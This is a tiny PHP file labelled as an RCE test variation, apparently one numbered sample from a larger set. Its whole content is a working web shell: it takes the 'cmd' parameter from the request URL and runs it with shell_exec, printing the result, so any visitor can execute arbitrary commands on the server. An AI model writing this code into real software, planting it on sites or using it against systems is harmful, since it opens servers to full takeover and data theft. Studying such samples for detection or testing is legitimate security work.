<?php
// RCE test variation #1383
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>